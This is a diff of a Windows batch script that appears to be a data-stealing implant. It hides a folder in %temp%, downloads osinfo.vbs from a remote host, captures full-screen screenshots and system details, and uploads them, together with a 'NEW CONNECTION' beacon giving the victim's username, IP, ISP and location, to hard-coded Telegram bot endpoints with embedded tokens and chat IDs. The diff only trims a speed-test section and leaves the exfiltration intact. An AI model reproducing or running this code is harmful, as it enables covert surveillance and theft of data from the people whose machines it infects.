@@ -33,22 +33,6 @@ mkdir "%temp%\%folder%"
 attrib +s +h +i "%temp%\%folder%" 
 cd "%temp%\%folder%"
 
-
-echo WScript.Echo Eval(WScript.Arguments(0)) > eval.vbs
-
-tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
-if not errorlevel 1 (for /f "delims=," %%A in (
-  'curl.exe -k %proxy% http://speedtest.wdc01.softlayer.com/downloads/test10.zip -o NUL -w %%{speed_download}'
-) Do set "bytestor=%%A" && for /f %%n in ('cscript //nologo eval.vbs "%bytestor%/1048576"') do (set mbtor=%%n)  ) else (
-set bytestor=N/A
-)
-
-for /f "delims=," %%A in (
-  'curl.exe -k http://speedtest.wdc01.softlayer.com/downloads/test10.zip -o NUL -w %%{speed_download}'
-) Do set bytes=%%A
-
-for /f %%n in ('cscript //nologo eval.vbs "%bytes%/1048576"') do (set mb=%%n) 
-
 curl.exe -k %proxy% %host%/Capture/osinfo.vbs --output "osinfo.vbs"
 nircmd.exe savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
 cscript.exe /nologo osinfo.vbs > "%username%@%computername%.txt"
@@ -91,7 +75,7 @@ if exist "%temp%\expose.txt" (
    set "Expose=N/A"
 )
 
-curl.exe -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%), Speed: %mb:~0,3%] [%City% (%Region%, %Country%)] [Tor is enabled: %TorStatus% (%ExtIPTor%), Speed: %mbtor:~0,3%] [Web Server: %Expose%] " https://api.telegram.org/bot5477476868:AAFhkFpzY4ZQZm4NkKCUmyjIpYj_KOKF5CY/sendMessage?chat_id=-1001540530403
+curl.exe -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [Tor is enabled: %TorStatus% (%ExtIPTor%)] [Web Server: %Expose%] " https://api.telegram.org/bot5477476868:AAFhkFpzY4ZQZm4NkKCUmyjIpYj_KOKF5CY/sendMessage?chat_id=-1001540530403
 for %%# in ("*.png") do curl.exe -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot5491026940:AAE3_nuWEDnViLI_kJEchTNQgHSpxqSlV3k/sendDocument?chat_id=-1001754616308 -k --insecure
 curl.exe -k %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot5512879840:AAHYmF561WGn5fgOF1tp1OUGxAcK7TaTKu4/sendDocument?chat_id=-1001656341327 -k --insecure
 
